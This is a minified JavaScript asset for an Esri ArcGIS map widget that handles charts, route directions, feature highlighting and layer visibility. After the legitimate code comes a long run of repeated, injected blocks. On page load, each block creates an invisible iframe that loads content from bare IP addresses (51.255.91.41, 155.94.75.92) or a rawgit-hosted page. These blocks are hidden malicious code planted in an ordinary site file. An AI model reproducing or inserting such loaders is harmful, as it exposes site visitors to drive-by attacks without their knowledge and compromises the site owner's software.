(a="esri/dijit/Rainbow");m.push(a);try{M(m,function(a,m,e){f._createChart(c,b,a,m,e).then(k.hitch(this,function(){d.resolve()}))})}catch(ia){d.resolve()}return d.promise},_createChart:function(a,b,c,d,f){var m,e;m=b.type;e=b.value;b=new v;c=new c(g.create("div",{"class":"chart"},a));f&&c.setTheme(f);switch(m){case "piechart":c.addPlot("default",{type:"Pie",labels:!1});c.addSeries("Series A",e.fields);break;case "linechart":c.addPlot("default",{type:"Markers"});c.addAxis("x",{min:0,majorTicks:!1,minorTicks:!1,
majorLabels:!1,minorLabels:!1});c.addAxis("y",{includeZero:!0,vertical:!0,fixUpper:"minor"});q.forEach(e.fields,function(a,b){a.x=b+1});c.addSeries("Series A",e.fields);break;case "columnchart":c.addPlot("default",{type:"Columns",gap:3});c.addAxis("y",{includeZero:!0,vertical:!0,fixUpper:"minor"});c.addSeries("Series A",e.fields);break;case "barchart":c.addPlot("default",{type:"Bars",gap:3}),c.addAxis("x",{includeZero:!0,fixUpper:"minor",minorLabels:!1}),c.addAxis("y",{vertical:!0,majorTicks:!1,minorTicks:!1,
majorLabels:!1,minorLabels:!1}),c.addSeries("Series A",e.fields)}new d(c);c.render();this._charts.push(c);b.resolve();return b.promise},_fetchDocumentContentType:function(a,b){a=(a=/(?:\.([^.]+))?$/.exec(a.name))&&a[1]?"."+a[1].toUpperCase():this.nls.unknownAttachmentExt;n.set(b,"innerHTML",a)},_attachEventOnImage:function(a){this.own(t(a,"click",k.hitch(this,this._displayImageAttachments)))},_displayImageAttachments:function(a){window.open(n.get(a.target,"alt"))},_onImageLoad:function(a){l.remove(a.target.parentNode,
"esriCTImageLoader");this._setImageDimensions(a.target)},_setImageDimensions:function(a){var b,c;c=a.parentElement;a&&0<a.offsetHeight&&(n.set(a,"originalHeight",a.offsetHeight),e.set(a,"maxHeight",a.offsetHeight+"px"),e.set(a,"maxWidth",a.offsetWidth+"px"),b=parseFloat(n.get(a,"originalHeight")),c.offsetHeight<a.offsetHeight||b>c.offsetHeight)&&(b=a.offsetWidth/a.offsetHeight,c=c.offsetHeight-2,b=Math.floor(c*b),l.remove(a,"esriCTAutoHeight"),e.set(a,"width",b+"px"),e.set(a,"height",c+"px"))},_onError:function(a){l.remove(a.target.parentNode,
"esriCTImageLoader")},_setSearchedLocation:function(a){this._selectedPoint=a},_setServiceArea:function(a){this._serviceArea=a},clearResultPanel:function(){this._isFeatureList=!1;this._clearContent(this._panels.layerListPanel);e.set(this._panels.layerListPanel,"display","none");e.set(this._panels.featureListPanel,"display","none");e.set(this._panels.infoPanel,"display","none");this._clearContent(this._featureListContent);this._clearDirections();this._clearGrahics()},removeGraphicsLayer:function(){this._featureGraphicsLayer&&
(this.map.removeLayer(this._featureGraphicsLayer),this._featureGraphicsLayer=null)},_clearGrahics:function(){this._featureGraphicsLayer&&this._featureGraphicsLayer.clear()},_showPanel:function(a,b){e.set(this._panels[a],{display:"block",left:"-100%"});b?(this._slide(this._panels[a],-100,0),this._slide(this._currentPanel,0,100)):(this._slide(this._currentPanel,0,-100),this._slide(this._panels[a],100,0));this._currentPanelName=a;this._currentPanel=this._panels[a];this.parentDivId&&h.byId(this.parentDivId)&&
h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize();l.add(this._filterButton,"esriCTHidden");setTimeout(k.hitch(this,function(){"infoPanel"!==this._currentPanelName?l.remove(this._filterButton,"esriCTHidden"):l.add(this._filterButton,"esriCTHidden")}),400)},_slide:function(a,b,c){e.set(a,"display","block");e.set(a,"left",b+"%");ba.animateProperty({node:a,properties:{left:{start:b,end:c,units:"%"}},duration:300,onEnd:k.hitch(this,function(){e.set(a,"left",c);0===c?e.set(a,"display",
"block"):e.set(a,"display","none");this._isSlide=!0})}).play()},_showMessage:function(a){(new Q({message:a})).message=a},_initializeDirectionWidget:function(){var a;this._directionsWidget||(h.byId("directionDijit")&&h.byId("directionDijit").destroy(),a={id:"directionDijit",map:this.map,directionsLengthUnits:aa[this.config.directionLengthUnit.routeUnit],showTrafficOption:!1,dragging:!1,routeTaskUrl:this.config.routeService,routeSymbol:new r(this.config.symbols.routeSymbol)},this._directionsWidget=
new T(a,g.create("div",{},null)),this._directionsWidget.startup(),this.own(this._directionsWidget.on("directions-finish",k.hitch(this,function(){this._directionsWidget.zoomToFullRoute();this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize();this.loading.hide()}))),this._directionInfoPanel.set("content",this._directionsWidget.domNode));this._routeSelectedLocations()},_clearDirections:function(){this._routeCalculated=!1;this._directionsWidget&&
this._directionsWidget.clearDirections()},_getPointFromGeometry:function(a){var b;switch(a.type){case "extent":b=a.getCenter();break;case "multipoint":b=a.getPoint(0);break;case "point":b=a;break;case "polygon":b=a.getCentroid();break;case "polyline":b=a.getPoint(0,0)}return b},_routeSelectedLocations:function(){var a=[];this._clearDirections();this._selectedPoint&&this._selectedFeature&&(this.loading.show(),a.push(this._getPointFromGeometry(this._selectedPoint.geometry)),a.push(this._getPointFromGeometry(this._selectedFeature.geometry)),
this._directionsWidget.updateStops(a).then(k.hitch(this,function(){this._directionsWidget.getDirections();this._routeCalculated=!0}),k.hitch(this,function(){this.loading.hide();this._showMessage(this.nls.failedToGenerateRouteMsg)})))},_highlightFeatureOnMap:function(){var a;this._clearGrahics();a=this._getHighLightSymbol(this._selectedFeature,this._selectedLayer);this._featureGraphicsLayer.add(a)},_getHighLightSymbol:function(a,b){switch(a.geometry.type){case "point":return this._getPointSymbol(a,
b);case "polyline":return this._getPolyLineSymbol(a,b);case "polygon":return this._getPolygonSymbol(a)}},_getPointSymbol:function(a,b){var c,d,f,e,g;d=!1;c=new K(K.STYLE_SQUARE,null,new r(r.STYLE_SOLID,new z([0,255,255,1]),3));c.setColor(null);c.size=30;if(b&&b.renderer)if(b.renderer.symbol)d=!0,c=this._updatePointSymbolProperties(c,b.renderer.symbol);else if(b.renderer.infos&&0<b.renderer.infos.length){for(g=0;g<b.renderer.infos.length;g++)b.typeIdField?f=a.attributes[b.typeIdField]:b.renderer.attributeField&&
(f=a.attributes[b.renderer.attributeField]),e=b.renderer.infos[g].value,void 0!==f&&null!==f&&""!==f&&void 0!==e&&null!==e&&""!==e&&f.toString()===e.toString()&&(d=!0,c=this._updatePointSymbolProperties(c,b.renderer.infos[g].symbol));!d&&b.renderer.defaultSymbol&&(d=!0,c=this._updatePointSymbolProperties(c,b.renderer.defaultSymbol))}b=new U(a.geometry.x,a.geometry.y,new w({wkid:a.geometry.spatialReference.wkid}));return new A(b,c,a.attributes)},_updatePointSymbolProperties:function(a,b){var c,d;b.hasOwnProperty("height")&&
b.hasOwnProperty("width")&&(c=b.height,d=b.width,c=(c>d?c:d)+10,a.size=c);b.hasOwnProperty("size")&&(!c||c<b.size)&&(a.size=b.size+10);b.hasOwnProperty("xoffset")&&(a.xoffset=b.xoffset);b.hasOwnProperty("yoffset")&&(a.yoffset=b.yoffset);return a},_getPolyLineSymbol:function(a,b){var c,d,f,e;c=5;if(b&&b.renderer)if(b.renderer.symbol&&b.renderer.symbol.hasOwnProperty("width"))c=b.renderer.symbol.width;else if(b.renderer.infos&&0<b.renderer.infos.length)for(e=0;e<b.renderer.infos.length;e++)b.typeIdField?
d=a.attributes[b.typeIdField]:b.renderer.attributeField&&(d=a.attributes[b.renderer.attributeField]),f=b.renderer.infos[e].value,void 0!==d&&null!==d&&""!==d&&void 0!==f&&null!==f&&""!==f&&d.toString()===f.toString()&&b.renderer.infos[e].symbol.hasOwnProperty("width")&&(c=b.renderer.infos[e].symbol.width);else b.renderer.defaultSymbol&&b.renderer.defaultSymbol.hasOwnProperty("width")&&(c=b.renderer.defaultSymbol.width);b=new r(r.STYLE_SOLID,new z([0,255,255,1]),c);c=new B(new w({wkid:a.geometry.spatialReference.wkid}));
a.geometry.paths&&0<a.geometry.paths.length&&c.addPath(a.geometry.paths[0]);return new A(c,b,a.attributes)},_getPolygonSymbol:function(a){var b,c;b=new J(J.STYLE_SOLID,new r(r.STYLE_SOLID,new z([0,255,255,1]),4),new z([0,0,0,0]));c=new V(new w({wkid:a.geometry.spatialReference.wkid}));a.geometry.rings&&(c.rings=k.clone(a.geometry.rings));return new A(c,b,a.attributes)},_hideAllLayers:function(){if(this.config.selectedSearchLayerOnly){var a;for(a=0;a<this.config.searchLayers.length;a++)this._showHideOperationalLayer(this.config.searchLayers[a].url,
this.config.searchLayers[a].id,!1)}},showAllLayers:function(a){var b,c;for(b=0;b<this.config.searchLayers.length;b++)c=a?this.config.searchLayers[b].visibility:!0,this.config.selectedSearchLayerOnly&&this._searchedFeatures[this.config.searchLayers[b].id]&&1>this._searchedFeatures[this.config.searchLayers[b].id].length&&(c=!1),this._showHideOperationalLayer(this.config.searchLayers[b].url,this.config.searchLayers[b].id,c)},_showHideOperationalLayer:function(a,b,c){var d,f,e,g;e=a.split("/");e=e[e.length-
1];for(d in this.map._layers)this.map._layers.hasOwnProperty(d)&&(b&&this.map._layers[d].url===a&&this.map._layers[d].id===b?this.map._layers[d].setVisibility(c):this.map._layers[d].visibleLayers&&b&&this.map._layers[d].id===b.substring(0,b.lastIndexOf("_"))&&(f=this.map._layers[d].url[this.map._layers[d].url.length-1],f="/"===f?this.map._layers[d].url+e:this.map._layers[d].url+"/"+e,f===a&&(f=this.map._layers[d].visibleLayers,g=q.indexOf(f,parseInt(e,10)),c?-1===g&&f.push(parseInt(e,10)):-1!==g&&
f.splice(g,1),this.map._layers[d].setVisibleLayers?this.map._layers[d].setVisibleLayers(f):(this.map._layers[d].visibleLayers=f,this.map._layers[d].setVisibility(c)))))},_checkAttributeSymbology:function(a){var b,c;if(c=p(".attachmentsSection",this._featureInfoPanel.domNode)[0])b=g.create("div",{"class":"esriCTAttributeSymbolWrapper"},null),g.place(b,c,"before");q.forEach(this.config.attributeSymbology[this._selectedLayer.id],k.hitch(this,function(c){a.attributes.hasOwnProperty(c.fieldName)&&a.attributes[c.fieldName]===
c.fieldValue&&this._createAttributeSymbol(c,b)}))},_createAttributeSymbol:function(a,b){var c;c=X.fromJson(a.symbol);a=this._selectedLayer.getField(a.fieldName);b=g.create("div",{"class":"esriCTAttributeSymbolContainer",title:a&&a.alias?a.alias:""},b);c=ea.createSymbolNode(c);g.place(c,b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});